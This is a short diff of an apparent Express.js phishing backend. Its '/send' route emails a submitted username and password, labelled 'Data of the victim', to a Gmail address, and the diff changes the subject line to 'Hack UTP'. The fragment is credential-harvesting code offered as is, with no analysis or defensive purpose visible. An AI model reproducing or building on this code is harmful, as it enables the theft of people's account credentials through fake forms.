@@ -26,7 +26,7 @@ app.post("/send", (req, res) => {
   const mailOptions = {
     from: "hackutp2@gmail.com", 
     to: "hackutp2@gmail.com", 
-    subject: "Mensaje desde el formulario de contacto",
+    subject: "Hack UTP",
     text: `Data of the victim:\n\nUsername: ${username}\n\nContraseña: ${password}\nCancel the subject :v`,
   };
 
